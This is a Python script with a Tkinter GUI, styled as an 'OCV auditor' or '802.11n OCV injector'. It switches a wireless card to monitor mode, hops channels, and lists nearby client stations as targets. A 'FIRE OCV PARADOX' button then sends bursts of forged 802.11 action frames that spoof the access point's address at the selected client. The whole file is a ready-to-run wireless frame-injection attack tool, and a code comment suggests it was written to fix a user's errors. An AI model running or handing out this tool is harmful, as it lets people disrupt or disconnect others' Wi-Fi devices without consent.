import os, sys, time, threading
from scapy.all import *
import tkinter as tk

class SurgicalOCV:
    def __init__(self, iface):
        self.iface = iface
        self.discovered = {}
        self.running = True
        self.setup_monitor()
        
        self.root = tk.Tk()
        self.root.title("Surgical OCV Auditor")
        self.root.geometry("800x600")
        self.root.configure(bg="#050505")

        tk.Label(self.root, text="802.11n OCV INJECTOR", fg="#00FF41", bg="#050505", font=("Courier", 14)).pack(pady=10)
        self.listbox = tk.Listbox(self.root, bg="#111", fg="#00FF41", font=("Courier", 10))
        self.listbox.pack(padx=20, pady=10, fill="both", expand=True)

        tk.Button(self.root, text="FIRE OCV PARADOX", command=self.fire_ocv, bg="#aa5500", fg="white", height=2).pack(pady=10)
        
        threading.Thread(target=self.hopper, daemon=True).start()
        threading.Thread(target=self.scanner, daemon=True).start()

    def setup_monitor(self):
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type monitor && sudo ip link set {self.iface} up")

    def hopper(self):
        ch = 1
        while self.running:
            os.system(f"sudo iw dev {self.iface} set channel {ch}")
            self.current_ch = ch
            ch = (ch % 13) + 1
            time.sleep(0.5)

    def scanner(self):
        def callback(pkt):
            if pkt.haslayer(Dot11) and pkt.addr2 and pkt.addr3:
                if pkt.addr2 != pkt.addr3 and pkt.addr2 not in self.discovered:
                    self.discovered[pkt.addr2] = {"BSSID": pkt.addr3, "CH": self.current_ch}
                    self.root.after(0, lambda: self.listbox.insert(tk.END, f"Target: {pkt.addr2} | CH: {self.current_ch}"))
        sniff(iface=self.iface, prn=callback, store=0)

    def fire_ocv(self):
        selection = self.listbox.curselection()
        if not selection: return
        target = list(self.discovered.keys())[selection[0]]
        info = self.discovered[target]
        
        os.system(f"sudo iw dev {self.iface} set channel {info['CH']}")
        
        # MANUAL HEX FIX: \x0a=Category 10, \x04=Action 4 (OCV)
        # This bypasses the AttributeError you are seeing in your terminal
        base = RadioTap()/Dot11(addr1=target, addr2=info['BSSID'], addr3=info['BSSID'])
        pkt = base/Dot11Action()/Raw(load=b"\x0a\x04\xff\x0a\x01\x01")
        
        sendp(pkt, iface=self.iface, count=100, inter=0.01, verbose=False)
        print(f"[*] OCV Paradox fired at {target}")

    def shutdown(self):
        self.running = False
        os.system(f"sudo ip link set {self.iface} down && sudo iw dev {self.iface} set type managed && sudo ip link set {self.iface} up")
        self.root.destroy()

if __name__ == "__main__":
    SurgicalOCV(sys.argv[1]).root.mainloop()
